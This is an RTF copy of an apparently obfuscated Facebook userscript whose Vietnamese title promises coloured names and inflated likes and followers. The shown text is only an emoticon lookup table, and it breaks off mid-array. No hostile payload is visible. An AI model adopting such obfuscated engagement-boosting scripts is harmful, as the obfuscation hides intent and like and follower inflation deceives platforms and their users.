{\rtf1\ansi\ansicpg1252\deff0\deflang1033{\fonttbl{\f0\fswiss\fcharset0 Arial;}{\f1\fswiss\fcharset238{\*\fname Arial;}Arial CE;}}
{\*\generator Msftedit 5.41.15.1507;}\viewkind4\uc1\pard\f0\fs20 // ==UserScript==\par
// @name            C\'e1ch L\'e0m T\'ean M\'e0u Facebook,T\f1\'e3ng Like \u7842?nh , Status , Like Comment , T\'e3ng Theo D\f0\'f5i Tr\'ean Facebook Tr\u7921?c Ti\u7871?p Tr\'ean FaceBook\par
// @description     All about Facebook By Ki\'ean\par
// @include         https://*.facebook.com/*\par
// @include         https://*.facebook.com/*/*\par
// @include         http://*.facebook.com/*\par
// @include         http://*.facebook.com/*/*\par
// ==/UserScript==\par
// ==13470X==\par
// ==============\par
// ==Icon==\par
(function () \{\par
    if (!document['querySelector']('#pageNav')) \{\par
        return;\par
    \};\par
    var _0x3384x1 = [\{\par
        "\\x63\\x68\\x61\\x72\\x73": ' :) ',\par
        "\\x63\\x6C\\x61\\x73\\x73": 'emoticon_smile',\par
        "\\x6E\\x61\\x6D\\x65": 'C\\u01B0\\u1EDDi t\\u01B0\\u01A1i'\par
    \}, \{\par
        "\\x63\\x68\\x61\\x72\\x73": ' :( ',\par
        "\\x63\\x6C\\x61\\x73\\x73": 'emoticon_frown',\par
        "\\x6E\\x61\\x6D\\x65": 'Bu\\u1ED3n ch\\xE1n'\par
    \}, \{\par
        "\\x63\\x68\\x61\\x72\\x73": ' :P ',\par
        "\\x63\\x6C\\x61\\x73\\x73": 'emoticon_tongue',\par
        "\\x6E\\x61\\x6D\\x65": 'L\\xE8 l\\u01B0\\u1EE1i'\par
    \}, \{\par
        "\\x63\\x68\\x61\\x72\\x73": ' :D ',\par
        "\\x63\\x6C\\x61\\x73\\x73": 'emoticon_grin',\par
        "\\x6E\\x61\\x6D\\x65": 'C\\u01B0\\u1EDDi toe'\par
    \}, \{\par
        "\\x63\\x68\\x61\\x72\\x73": ' :o ',\par
        "\\x63\\x6C\\x61\\x73\\x73": 'emoticon_gasp',\par
        "\\x6E\\x61\\x6D\\x65": 'Ng\\u1EA1c nhi\\xEAn'\par
    \}, \{\par
        "\\x63\\x68\\x61\\x72\\x73": ' ;) ',\par
        "\\x63\\x6C\\x61\\x73\\x73": 'emoticon_wink',\par
        "\\x6E\\x61\\x6D\\x65": 'Nh\\xE1y m\\u1EAFt'\par
    \}, \{\par
        "\\x63\\x68\\x61\\x72\\x73": ' :v ',\par
        "\\x63\\x6C\\x61\\x73\\x73": 'emoticon_pacman',\par
        "\\x6E\\x61\\x6D\\x65": 'C\\u01B0\\u1EDDi h\\xE1 mi\\u1EC7ng'\par
    \}, \{\par
        "\\x63\\x68\\x61\\x72\\x73": ' >:( ',\par
        "\\x63\\x6C\\x61\\x73\\x73": 'emoticon_grumpy',\par
        "\\x6E\\x61\\x6D\\x65": 'Nh\\u0103n m\\u1EB7t'\par
    \}, \{\par
        "\\x63\\x68\\x61\\x72\\x73": ' :/ ',\par
        "\\x63\\x6C\\x61\\x73\\x73": 'emoticon_unsure',\par
        "\\x6E\\x61\\x6D\\x65": 'M\\u1EBFu'\par
    \}, \{\par
        "\\x63\\x68\\x61\\x72\\x73": ' :\\'( ',\par
        "\\x63\\x6C\\x61\\x73\\x73": 'emoticon_cry',\par
        "\\x6E\\x61\\x6D\\x65": 'Kh\\xF3c'\par
    \}, \{\par
        "\\x63\\x68\\x61\\x72\\x73": ' ^_^ ',\par
        "\\x63\\x6C\\x61\\x73\\x73": 'emoticon_kiki',\par
        "\\x6E\\x61\\x6D\\x65": 'C\\u01B0\\u1EDDi t\\xEDt m\\u1EAFt'\par
    \}, \{\par
        "\\x63\\x68\\x61\\x72\\x73": ' 8) ',\par
        "\\x63\\x6C\\x61\\x73\\x73": 'emoticon_glasses',\par
        "\\x6E\\x61\\x6D\\x65": '\\u0110eo k\\xEDnh tr\\u1EAFng'\par
    \}, \{\par
        "\\x63\\x68\\x61\\x72\\x73": ' B| ',\par
        "\\x63\\x6C\\x61\\x73\\x73": 'emoticon_sunglasses',\par
        "\\x6E\\x61\\x6D\\x65": '\\u0110eo k\\xEDnh \\u0111en'\par
    \}, \{\par
        "\\x63\\x68\\x61\\x72\\x73": ' <3 ',\par
        "\\x63\\x6C\\x61\\x73\\x73": 'emoticon_heart',\par
        "\\x6E\\x61\\x6D\\x65": 'Tr\\xE1i tim'\par
    \}, \{\par
        "\\x63\\x68\\x61\\x72\\x73": ' 3:) ',\par
        "\\x63\\x6C\\x61\\x73\\x73": 'emoticon_devil',\par
        "\\x6E\\x61\\x6D\\x65": 'Qu\\u1EF7 s\\u1EE9'\par
    \}, \{\par
        "\\x63\\x68\\x61\\x72\\x73": ' O:) ',\par
        "\\x63\\x6C\\x61\\x73\\x73": 'emoticon_angel',\par
        "\\x6E\\x61\\x6D\\x65": 'Thi\\xEAn th\\u1EA7n'\par
    \}, \{\par
        "\\x63\\x68\\x61\\x72\\x73": ' -_- ',\par
        "\\x63\\x6C\\x61\\x73\\x73": 'emoticon_squint',\par
        "\\x6E\\x61\\x6D\\x65": 'Nh\\u1EAFm m\\u1EAFt l\\u1EA1i'\par
    \}, \{\par
        "\\x63\\x68\\x61\\x72\\x73": ' o.O ',\par
        "\\x63\\x6C\\x61\\x73\\x73": 'emoticon_confused',\par
        "\\x6E\\x61\\x6D\\x65": 'Tr\\u1EE3n tr\\xF2n m\\u1EAFt'\par
    \}, \{\par
        "\\x63\\x68\\x61\\x72\\x73": ' >:o ',\par
        "\\x63\\x6C\\x61\\x73\\x73": 'emoticon_upset',\par
        "\\x6E\\x61\\x6D\\x65": 'Kh\\xF3 ch\\u1ECBu qu\\xE1'\par
    \}, \{\par
        "\\x63\\x68\\x61\\x72\\x73": ' :3 ',\par
        "\\x63\\x6C\\x61\\x73\\x73": 'emoticon_colonthree',\par
        "\\x6E\\x61\\x6D\\x65": 'Kh\\xF4ng quan t\\xE2m'\par
    \}, \{\par
        "\\x63\\x68\\x61\\x72\\x73": ' (y) ',\par
        "\\x63\\x6C\\x61\\x73\\x73": 'emoticon_like',\par
        "\\x6E\\x61\\x6D\\x65": 'Th\\xEDch'\par
    \}, \{\par
        "\\x63\\x68\\x61\\x72\\x73": ' :* ',\par
        "\\x63\\x6C\\x61\\x73\\x73": 'emoticon emoticon_kiss',\par
        "\\x6E\\x61\\x6D\\x65": 'H\\xF4n c\\xE1i coi'\par
    \}, \{\par
        "\\x63\\x68\\x61\\x72\\x73": ' (^^^) ',\par
        "\\x63\\x6C\\x61\\x73\\x73": 'emoticon_shark',\par
        "\\x6E\\x61\\x6D\\x65": 'C\\xE1 heo t\\u1EE9c gi\\u1EADn'\par
    \}, \{\par
        "\\x63\\x68\\x61\\x72\\x73": ' :|] ',\par
        "\\x63\\x6C\\x61\\x73\\x73": 'emoticon_robot',\par
        "\\x6E\\x61\\x6D\\x65": 'Robot'\par
    \}, \{\par
        "\\x63\\x68\\x61\\x72\\x73": ' <(") ',\par
        "\\x63\\x6C\\x61\\x73\\x73": 'emoticon_penguin',\par
        "\\x6E\\x61\\x6D\\x65": 'Chim c\\xE1nh c\\u1EE5t'\par
    \}, \{\par
        "\\x63\\x68\\x61\\x72\\x73": ' :poop: ',\par
        "\\x63\\x6C\\x61\\x73\\x73": 'emoticon_poop',\par
        "\\x6E\\x61\\x6D\\x65": '\\u0102n shit nh\\xE9'\par
    \}, \{\par
        "\\x63\\x68\\x61\\x72\\x73": ' :putnam: ',\par
        "\\x63\\x6C\\x61\\x73\\x73": 'emoticon_putnam',\par
        "\\x6E\\x61\\x6D\\x65": 'Th\\u1EBF c\\u01A1 \\xE1?'\par
    \}, \{\par
        "\\x63\\x68\\x61\\x72\\x73": ' \\uD83C\\uDF02 ',\par
        "\\x63\\x6C\\x61\\x73\\x73": '_1az _1a- _2c0',\par
        "\\x6E\\x61\\x6D\\x65": 'M\\u01B0a r\\u1ED3i, \\xF4 n\\xE8'\par
    \}, \{\par
        "\\x63\\x68\\x61\\x72\\x73": ' \\uD83C\\uDF0A ',\par
        "\\x63\\x6C\\x61\\x73\\x73": '_1az _1a- _2c1',\par
        "\\x6E\\x61\\x6D\\x65": 'S\\xF3ng bi\\u1EC3n'\par
    \}, \{\par
        "\\x63\\x68\\x61\\x72\\x73": ' \\uD83C\\uDF19 ',\par
        "\\x63\\x6C\\x61\\x73\\x73": '_1az _1a- _2c2',\par
        "\\x6E\\x61\\x6D\\x65": 'V\\u1EA7ng tr\\u0103ng'\par
    \}, \{\par
        "\\x63\\x68\\x61\\x72\\x73": ' \\uD83C\\uDF1F ',\par
        "\\x63\\x6C\\x61\\x73\\x73": '_1az _1a- _2c3',\par
        "\\x6E\\x61\\x6D\\x65": 'Ng\\xF4i sao'\par
    \}, \{\par
        "\\x63\\x68\\x61\\x72\\x73": ' \\uD83C\\uDF31 ',\par
        "\\x63\\x6C\\x61\\x73\\x73": '_1az _1a- _2c4',\par
        "\\x6E\\x61\\x6D\\x65": 'C\\u1ECF'\par
    \}, \{\par
        "\\x63\\x68\\x61\\x72\\x73": ' \\uD83C\\uDF34 ',\par
        "\\x63\\x6C\\x61\\x73\\x73": '_1az _1a- _2c5',\par
        "\\x6E\\x61\\x6D\\x65": 'C\\xE2y c\\xF4 \\u0111\\u01A1n'\par
    \}, \{\par
        "\\x63\\x68\\x61\\x72\\x73": ' \\uD83C\\uDF35 ',\par
        "\\x63\\x6C\\x61\\x73\\x73": '_1az _1a- _2c6',\par
        "\\x6E\\x61\\x6D\\x65": 'X\\u01B0\\u01A1ng r\\u1ED3ng'\par
    \}, \{\par
        "\\x63\\x68\\x61\\x72\\x73": ' \\uD83C\\uDF37 ',\par
        "\\x63\\x6C\\x61\\x73\\x73": '_1az _1a- _2c7',\par
        "\\x6E\\x61\\x6D\\x65": 'Hoa Tulip'\par
    \}, \{\par
        "\\x63\\x68\\x61\\x72\\x73": ' \\uD83C\\uDF38 ',\par
        "\\x63\\x6C\\x61\\x73\\x73": '_1az _1a- _2c8',\par
        "\\x6E\\x61\\x6D\\x65": 'Hoa 5 c\\xE1nh'\par
    \}, \{\par
        "\\x63\\x68\\x61\\x72\\x73": ' \\uD83C\\uDF39 ',\par
        "\\x63\\x6C\\x61\\x73\\x73": '_1az _1a- _2c9',\par
        "\\x6E\\x61\\x6D\\x65": 'Hoa h\\u1ED3ng'\par
    \}, \{\par
        "\\x63\\x68\\x61\\x72\\x73": ' \\uD83C\\uDF3A ',\par
        "\\x63\\x6C\\x61\\x73\\x73": '_1az _1a- _2ca',\par
        "\\x6E\\x61\\x6D\\x65": 'C\\xE2y hoa tr\\xF2n'\par
    \}, \{\par
        "\\x63\\x68\\x61\\x72\\x73": ' \\uD83C\\uDF3B ',\par
        "\\x63\\x6C\\x61\\x73\\x73": '_1az _1a- _2cb',\par
        "\\x6E\\x61\\x6D\\x65": 'Hoa h\\u01B0\\u1EDBng d\\u01B0\\u01A1ng'\par
    \}, \{\par
        "\\x63\\x68\\x61\\x72\\x73": ' \\uD83C\\uDF3E ',\par
        "\\x63\\x6C\\x61\\x73\\x73": '_1az _1a- _2cc',\par
        "\\x6E\\x61\\x6D\\x65": 'C\\xE2y l\\xFAa'\par
    \}, \{\par
        "\\x63\\x68\\x61\\x72\\x73": ' \\uD83C\\uDF40 ',\par
        "\\x63\\x6C\\x61\\x73\\x73": '_1az _1a- _2cd',\par
        "\\x6E\\x61\\x6D\\x65": 'Hoa 4 m\\xF9a'\par
    \}, \{\par
        "\\x63\\x68\\x61\\x72\\x73": ' \\uD83C\\uDF41 ',\par
        "\\x63\\x6C\\x61\\x73\\x73": '_1az _1a- _2ce',\par
        "\\x6E\\x61\\x6D\\x65": 'L\\xE1 phong'\par
    \}, \{\par
        "\\x63\\x68\\x61\\x72\\x73": ' \\uD83C\\uDF42 ',\par
        "\\x63\\x6C\\x61\\x73\\x73": '_1az _1a- _2cf',\par
        "\\x6E\\x61\\x6D\\x65": 'L\\xE1 Fallen'\par
    \}, \{\par
        "\\x63\\x68\\x61\\x72\\x73": ' \\uD83C\\uDF43 ',\par
        "\\x63\\x6C\\x61\\x73\\x73": '_1az _1a- _2cg',\par
        "\\x6E\\x61\\x6D\\x65": 'L\\xE1 xanh tr\\u01B0\\u1EDBc gi\\xF3'\par
    \}, \{\par
        "\\x63\\x68\\x61\\x72\\x73": ' \\uD83C\\uDF4A ',\par
        "\\x63\\x6C\\x61\\x73\\x73": '_1az _1a- _2ch',\par
        "\\x6E\\x61\\x6D\\x65": 'Qu\\u1EA3 qu\\xFDt'\par
    \}, \{\par
        "\\x63\\x68\\x61\\x72\\x73": ' \\uD83C\\uDF4E ',\par
        "\\x63\\x6C\\x61\\x73\\x73": '_1az _1a- _2ci',\par
        "\\x6E\\x61\\x6D\\x65": 'T\\xE1o \\u0111\\u1ECF'\par
    \}, \{\par
        "\\x63\\x68\\x61\\x72\\x73": ' \\uD83C\\uDF53 ',\par
        "\\x63\\x6C\\x61\\x73\\x73": '_1az _1a- _2cj',\par
        "\\x6E\\x61\\x6D\\x65": 'D\\xE2u t\\xE2y, \\u0103n \\u0111i'\par
    \}, \{\par
        "\\x63\\x68\\x61\\x72\\x73": ' \\uD83C\\uDF54 ',\par
        "\\x63\\x6C\\x61\\x73\\x73": '_1az _1a- _2ck',\par
        "\\x6E\\x61\\x6D\\x65": 'B\\xE1nh m\\u1EF3 ba t\\xEA'\par
    \}, \{\par
        "\\x63\\x68\\x61\\x72\\x73": ' \\uD83C\\uDF78 ',\par
        "\\x63\\x6C\\x61\\x73\\x73": '_1az _1a- _2cl',\par
        "\\x6E\\x61\\x6D\\x65": 'N\\u01B0\\u1EDBc hoa qu\\u1EA3'\par
    \}, \{\par
        "\\x63\\x68\\x61\\x72\\x73": ' \\uD83C\\uDF7A ',\par
        "\\x63\\x6C\\x61\\x73\\x73": '_1az _1a- _2cm',\par
        "\\x6E\\x61\\x6D\\x65": 'Bia'\par
    \}, \{\par
        "\\x63\\x68\\x61\\x72\\x73": ' \\uD83C\\uDF81 ',\par
        "\\x63\\x6C\\x61\\x73\\x73": '_1az _1a- _2cn',\par
        "\\x6E\\x61\\x6D\\x65": 'H\\u1ED9p qu\\xE0'\par
    \}, \{\par
        "\\x63\\x68\\x61\\x72\\x73": ' \\uD83C\\uDF83 ',\par
        "\\x63\\x6C\\x61\\x73\\x73": '_1az _1a- _2co',\par
        "\\x6E\\x61\\x6D\\x65": 'Qu\\u1EA3 b\\xED ng\\xF4'\par
    \}, \{\par
        "\\x63\\x68\\x61\\x72\\x73": ' \\uD83C\\uDF84 ',\par
        "\\x63\\x6C\\x61\\x73\\x73": '_1az _1a- _2cp',\par
        "\\x6E\\x61\\x6D\\x65": 'C\\xE2y th\\xF4ng Noel'\par
    \}, \{\par
        "\\x63\\x68\\x61\\x72\\x73": ' \\uD83C\\uDF85 ',\par
        "\\x63\\x6C\\x61\\x73\\x73": '_1az _1a- _2cq',\par
        "\\x6E\\x61\\x6D\\x65": '\\xD4ng gi\\xE0 Noel'\par
    \}, \{\par
        "\\x63\\x68\\x61\\x72\\x73": ' \\uD83C\\uDF88 ',\par
        "\\x63\\x6C\\x61\\x73\\x73": '_1az _1a- _2cr',\par
        "\\x6E\\x61\\x6D\\x65": 'B\\xF3ng bay'\par
    \}, \{\par
        "\\x63\\x68\\x61\\x72\\x73": ' \\uD83C\\uDF89 ',\par
        "\\x63\\x6C\\x61\\x73\\x73": '_1az _1a- _2cs',\par
        "\\x6E\\x61\\x6D\\x65": 'K\\xE8n cho Party'\par
    \}, \{\par
        "\\x63\\x68\\x61\\x72\\x73": ' \\uD83C\\uDF8D ',\par
        "\\x63\\x6C\\x61\\x73\\x73": '_1az _1a- _2ct',\par
        "\\x6E\\x61\\x6D\\x65": 'V\\u01B0\\u01A1ng mi\\u1EC7ng'\par
    \}, \{\par
        "\\x63\\x68\\x61\\x72\\x73": ' \\uD83C\\uDF8E ',\par
        "\\x63\\x6C\\x61\\x73\\x73": '_1az _1a- _2cu',\par
        "\\x6E\\x61\\x6D\\x65": 'C\\u1EB7p \\u0111\\xF4i'\par
    \}, \{\par
        "\\x63\\x68\\x61\\x72\\x73": ' \\uD83C\\uDF8F ',\par
        "\\x63\\x6C\\x61\\x73\\x73": '_1az _1a- _2cv',\par
        "\\x6E\\x61\\x6D\\x65": '\\u0110\\xF4i c\\xE1'\par
    \}, \{\par
        "\\x63\\x68\\x61\\x72\\x73": ' \\uD83C\\uDF90 ',\par
        "\\x63\\x6C\\x61\\x73\\x73": '_1az _1a- _2cw',\par
        "\\x6E\\x61\\x6D\\x65": 'K\\u1EB9o gi\\xF3'\par
    \}, \{\par
        "\\x63\\x68\\x61\\x72\\x73": ' \\uD83C\\uDF93 ',\par
        "\\x63\\x6C\\x61\\x73\\x73": '_1az _1a- _2cx',\par
        "\\x6E\\x61\\x6D\\x65": 'M\\u0169 c\\u1EED nh\\xE2n'\par
    \}, \{\par
        "\\x63\\x68\\x61\\x72\\x73": ' \\uD83C\\uDFB5 ',\par
        "\\x63\\x6C\\x61\\x73\\x73": '_1az _1a- _2cy',\par
        "\\x6E\\x61\\x6D\\x65": 'B\\u1EA3n nh\\u1EA1c'\par
    \}, \{\par
        "\\x63\\x68\\x61\\x72\\x73": ' \\uD83C\\uDFB6 ',\par
        "\\x63\\x6C\\x61\\x73\\x73": '_1az _1a- _2cz',\par
        "\\x6E\\x61\\x6D\\x65": 'N\\u1ED1t nh\\u1EA1c'\par
    \}, \{\par
        "\\x63\\x68\\x61\\x72\\x73": ' \\uD83C\\uDFBC ',\par
        "\\x63\\x6C\\x61\\x73\\x73": '_1az _1a- _2c-',\par
        "\\x6E\\x61\\x6D\\x65": '\\xC2m nh\\u1EA1c'\par
    \}, \{\par
        "\\x63\\x68\\x61\\x72\\x73": ' \\uD83D\\uDC0D ',\par
        "\\x63\\x6C\\x61\\x73\\x73": '_1az _1a- _2c_',\par
        "\\x6E\\x61\\x6D\\x65": 'Con r\\u1EAFn'\par
    \}, \{\par
        "\\x63\\x68\\x61\\x72\\x73": ' \\uD83D\\uDC0E ',\par
        "\\x63\\x6C\\x61\\x73\\x73": '_1az _1a- _2d0',\par
        "\\x6E\\x61\\x6D\\x65": 'Con ng\\u1EF1a'\par
    \}, \{\par
        "\\x63\\x68\\x61\\x72\\x73": ' \\uD83D\\uDC11 ',\par
        "\\x63\\x6C\\x61\\x73\\x73": '_1az _1a- _2d1',\par
        "\\x6E\\x61\\x6D\\x65": 'Con d\\xEA'\par
    \}, \{\par
        "\\x63\\x68\\x61\\x72\\x73": ' \\uD83D\\uDC12 ',\par
        "\\x63\\x6C\\x61\\x73\\x73": '_1az _1a- _2d2',\par
        "\\x6E\\x61\\x6D\\x65": 'Con khi'\par
    \}, \{\par
        "\\x63\\x68\\x61\\x72\\x73": ' \\uD83D\\uDC14 ',\par
        "\\x63\\x6C\\x61\\x73\\x73": '_1az _1a- _2d3',\par
        "\\x6E\\x61\\x6D\\x65": 'Con g\\xE0'\par
    \}, \{\par
        "\\x63\\x68\\x61\\x72\\x73": ' \\uD83D\\uDC17 ',\par
        "\\x63\\x6C\\x61\\x73\\x73": '_1az _1a- _2d4',\par
        "\\x6E\\x61\\x6D\\x65": 'Con l\\u1EE3n'\par
    \}, \{\par
        "\\x63\\x68\\x61\\x72\\x73": ' \\uD83D\\uDC18 ',\par
        "\\x63\\x6C\\x61\\x73\\x73": '_1az _1a- _2d5',\par
        "\\x6E\\x61\\x6D\\x65": 'Con voi'\par
    \}, \{\par
        "\\x63\\x68\\x61\\x72\\x73": ' \\uD83D\\uDC19 ',\par
        "\\x63\\x6C\\x61\\x73\\x73": '_1az _1a- _2d6',\par
        "\\x6E\\x61\\x6D\\x65": 'Con b\\u1EA1ch tu\\u1ED9c'\par
    \}, \{\par
        "\\x63\\x68\\x61\\x72\\x73": ' \\uD83D\\uDC1A ',\par
        "\\x63\\x6C\\x61\\x73\\x73": '_1az _1a- _2d7',\par
        "\\x6E\\x61\\x6D\\x65": 'Con \\u1ED1c'\par
    \}, \{\par
        "\\x63\\x68\\x61\\x72\\x73": ' \\uD83D\\uDC1B ',\par
        "\\x63\\x6C\\x61\\x73\\x73": '_1az _1a- _2d8',\par
        "\\x6E\\x61\\x6D\\x65": 'Con ch\\u0103n'\par
    \}, \{\par
        "\\x63\\x68\\x61\\x72\\x73": ' \\uD83D\\uDC1F ',\par
        "\\x63\\x6C\\x61\\x73\\x73": '_1az _1a- _2d9',\par
        "\\x6E\\x61\\x6D\\x65": 'Con c\\xE1'\par
    \}, \{\par
        "\\x63\\x68\\x61\\x72\\x73": ' \\uD83D\\uDC20 ',\par
        "\\x63\\x6C\\x61\\x73\\x73": '_1az _1a- _2da',\par
        "\\x6E\\x61\\x6D\\x65": 'C\\xE1 c\\u1EA3nh'\par
    \}, \{\par
        "\\x63\\x68\\x61\\x72\\x73": ' \\uD83D\\uDC21 ',\par
        "\\x63\\x6C\\x61\\x73\\x73": '_1az _1a- _2db',\par
        "\\x6E\\x61\\x6D\\x65": 'C\\xE1 mang ph\\xECnh'\par
    \}, \{\par
        "\\x63\\x68\\x61\\x72\\x73": ' \\uD83D\\uDC25 ',\par
        "\\x63\\x6C\\x61\\x73\\x73": '_1az _1a- _2dc',\par
        "\\x6E\\x61\\x6D\\x65": 'G\\xE0 con'\par
    \}, \{\par
        "\\x63\\x68\\x61\\x72\\x73": ' \\uD83D\\uDC26 ',\par
        "\\x63\\x6C\\x61\\x73\\x73": '_1az _1a- _2dd',\par
        "\\x6E\\x61\\x6D\\x65": 'Con chim'\par
    \}, \{\par
        "\\x63\\x68\\x61\\x72\\x73": ' \\uD83D\\uDC27 ',\par
        "\\x63\\x6C\\x61\\x73\\x73": '_1az _1a- _2de',\par
        "\\x6E\\x61\\x6D\\x65": 'Chim c\\xE1nh c\\u1EE5t 2'\par
    \}, \{\par
        "\\x63\\x68\\x61\\x72\\x73": ' \\uD83D\\uDC28 ',\par
        "\\x63\\x6C\\x61\\x73\\x73": '_1az _1a- _2df',\par
        "\\x6E\\x61\\x6D\\x65": 'G\\u1EA5u'\par
    \}, \{\par
        "\\x63\\x68\\x61\\x72\\x73": ' \\uD83D\\uDC29 ',\par
        "\\x63\\x6C\\x61\\x73\\x73": '_1az _1a- _2dg',\par
        "\\x6E\\x61\\x6D\\x65": 'Ch\\xF3 th\\xE8 l\\u01B0\\u1EE1i'\par
    \}, \{\par
        "\\x63\\x68\\x61\\x72\\x73": ' \\uD83D\\uDC2B ',\par
        "\\x63\\x6C\\x61\\x73\\x73": '_1az _1a- _2dh',\par
        "\\x6E\\x61\\x6D\\x65": 'Con l\\u1EA1c \\u0111\\xE0'\par
    \}, \{\par
        "\\x63\\x68\\x61\\x72\\x73": ' \\uD83D\\uDC2C ',\par
        "\\x63\\x6C\\x61\\x73\\x73": '_1az _1a- _2di',\par
        "\\x6E\\x61\\x6D\\x65": 'Con c\\xE1 voi'\par
    \}, \{\par
        "\\x63\\x68\\x61\\x72\\x73": ' \\uD83D\\uDC2D ',\par
        "\\x63\\x6C\\x61\\x73\\x73": '_1az _1a- _2dj',\par
        "\\x6E\\x61\\x6D\\x65": 'M\\u1EB7t chu\\u1ED9t'\par
    \}, \{\par
        "\\x63\\x68\\x61\\x72\\x73": ' \\uD83D\\uDC2E ',\par
        "\\x63\\x6C\\x61\\x73\\x73": '_1az _1a- _2dk',\par
        "\\x6E\\x61\\x6D\\x65": 'M\\u1EB7t b\\xF2'\par
    \}, \{\par
        "\\x63\\x68\\x61\\x72\\x73": ' \\uD83D\\uDC2F ',\par
        "\\x63\\x6C\\x61\\x73\\x73": '_1az _1a- _2dl',\par
        "\\x6E\\x61\\x6D\\x65": 'M\\u1EB7t m\\xE8o'\par
    \}, \{\par
        "\\x63\\x68\\x61\\x72\\x73": ' \\uD83D\\uDC30 ',\par
        "\\x63\\x6C\\x61\\x73\\x73": '_1az _1a- _2dm',\par
        "\\x6E\\x61\\x6D\\x65": 'M\\u1EB7t th\\u1ECF'\par
    \}, \{\par
        "\\x63\\x68\\x61\\x72\\x73": ' \\uD83D\\uDC31 ',\par
        "\\x63\\x6C\\x61\\x73\\x73": '_1az _1a- _2dn',\par
        "\\x6E\\x61\\x6D\\x65": 'M\\u1EB7t m\\xE8o l\\u01B0\\u1EDDi'\par
    \}, \{\par
        "\\x63\\x68\\x61\\x72\\x73": ' \\uD83D\\uDC33 ',\par
        "\\x63\\x6C\\x61\\x73\\x73": '_1az _1a- _2do',\par
        "\\x6E\\x61\\x6D\\x65": 'C\\xE1 voi'\par
    \}, \{\par
        "\\x63\\x68\\x61\\x72\\x73": ' \\uD83D\\uDC34 ',\par
        "\\x63\\x6C\\x61\\x73\\x73": '_1az _1a- _2dp',\par
        "\\x6E\\x61\\x6D\\x65": 'M\\u1EB7t ng\\u1EF1a'\par
    \}, \{\par
        "\\x63\\x68\\x61\\x72\\x73": ' \\uD83D\\uDC35 ',\par
        "\\x63\\x6C\\x61\\x73\\x73": '_1az _1a- _2dq',\par
        "\\x6E\\x61\\x6D\\x65": 'M\\u1EB7t kh\\u1EC9'\par
    \}, \{\par
        "\\x63\\x68\\x61\\x72\\x73": ' \\uD83D\\uDC37 ',\par
        "\\x63\\x6C\\x61\\x73\\x73": '_1az _1a- _2dr',\par
        "\\x6E\\x61\\x6D\\x65": 'M\\u1EB7t l\\u1EE3n'\par
    \}, \{\par
        "\\x63\\x68\\x61\\x72\\x73": ' \\uD83D\\uDC38 ',\par
        "\\x63\\x6C\\x61\\x73\\x73": '_1az _1a- _2ds',\par
        "\\x6E\\x61\\x6D\\x65": 'M\\u1EB7t \\u1EBFch'\par
    \}, \{\par
        "\\x63\\x68\\x61\\x72\\x73": ' \\uD83D\\uDC39 ',\par
        "\\x63\\x6C\\x61\\x73\\x73": '_1az _1a- _2dt',\par
        "\\x6E\\x61\\x6D\\x65": 'M\\u1EB7t chu\\u1ED9t Hamster'\par
    \}, \{\par
        "\\x63\\x68\\x61\\x72\\x73": ' \\uD83D\\uDC3A ',\par
        "\\x63\\x6C\\x61\\x73\\x73": '_1az _1a- _2du',\par
        "\\x6E\\x61\\x6D\\x65": 'M\\u1EB7t ch\\xF3 s\\xF3i'\par
    \}, \{\par
        "\\x63\\x68\\x61\\x72\\x73": ' \\uD83D\\uDC3B ',\par
        "\\x63\\x6C\\x61\\x73\\x73": '_1az _1a- _2dv',\par
        "\\x6E\\x61\\x6D\\x65": 'M\\u1EB7t g\\u1EA5u'\par
    \}, \{\par
        "\\x63\\x68\\x61\\x72\\x73": ' \\uD83D\\uDC3E ',\par
        "\\x63\\x6C\\x61\\x73\\x73": '_1az _1a- _2dw',\par
        "\\x6E\\x61\\x6D\\x65": 'B\\xE0n ch\\xE2n'\par
    \}, \{\par
        "\\x63\\x68\\x61\\x72\\x73": ' \\uD83D\\uDC40 ',\par
        "\\x63\\x6C\\x61\\x73\\x73": '_1az _1a- _2dx',\par
        "\\x6E\\x61\\x6D\\x65": 'Ng\\xF3'\par
    \}, \{\par
        "\\x63\\x68\\x61\\x72\\x73": ' \\uD83D\\uDC42 ',\par
        "\\x63\\x6C\\x61\\x73\\x73": '_1az _1a- _2dy',\par
        "\\x6E\\x61\\x6D\\x65": 'H\\xF3ng'\par
    \}, \{\par
        "\\x63\\x68\\x61\\x72\\x73": ' \\uD83D\\uDC43 ',\par
        "\\x63\\x6C\\x61\\x73\\x73": '_1az _1a- _2dz',\par
        "\\x6E\\x61\\x6D\\x65": 'M\\u0169i'\par
    \}, \{\par
        "\\x63\\x68\\x61\\x72\\x73": ' \\uD83D\\uDC44 ',\par
        "\\x63\\x6C\\x61\\x73\\x73": '_1az _1a- _2d-',\par
        "\\x6E\\x61\\x6D\\x65": 'H\\xF4n mi\\u1EBFng n\\xE0o'\par
    \}, \{\par
        "\\x63\\x68\\x61\\x72\\x73": ' \\uD83D\\uDC45 ',\par
        "\\x63\\x6C\\x61\\x73\\x73": '_1az _1a- _2d_',\par
        "\\x6E\\x61\\x6D\\x65": 'Te t\\u1EDFn'\par
    \}, \{\par
        "\\x63\\x68\\x61\\x72\\x73": ' \\uD83D\\uDC46 ',\par
        "\\x63\\x6C\\x61\\x73\\x73": '_1az _1a- _2e0',\par
        "\\x6E\\x61\\x6D\\x65": '\\u0110\\u1EE9a comment \\u1EDF tr\\xEAn r\\u1EA5t g\\xE0'\par
    \}, \{\par
        "\\x63\\x68\\x61\\x72\\x73": ' \\uD83D\\uDC47 ',\par
        "\\x63\\x6C\\x61\\x73\\x73": '_1az _1a- _2e1',\par
        "\\x6E\\x61\\x6D\\x65": '\\u0110\\u1EE9a comment \\u1EDF d\\u01B0\\u1EDBi r\\u1EA5t g\\xE0'\par
    \}, \{\par
        "\\x63\\x68\\x61\\x72\\x73": ' \\uD83D\\uDC48 ',\par
        "\\x63\\x6C\\x61\\x73\\x73": '_1az _1a- _2e2',\par
        "\\x6E\\x61\\x6D\\x65": 'B\\xEAn tr\\xE1i em \\u01A1i'\par
    \}, \{\par
        "\\x63\\x68\\x61\\x72\\x73": ' \\uD83D\\uDC49 ',\par
        "\\x63\\x6C\\x61\\x73\\x73": '_1az _1a- _2e3',\par
        "\\x6E\\x61\\x6D\\x65": 'B\\xEAn ph\\u1EA3i em \\u01A1i'\par
    \}, \{\par
        "\\x63\\x68\\x61\\x72\\x73": ' \\uD83D\\uDC4A ',\par
        "\\x63\\x6C\\x61\\x73\\x73": '_1az _1a- _2e4',\par
        "\\x6E\\x61\\x6D\\x65": 'N\\xE0y th\\xEC nh\\xECn \\u0111\\u1EC3u'\par
    \}, \{\par
        "\\x63\\x68\\x61\\x72\\x73": ' \\uD83D\\uDC4B ',\par
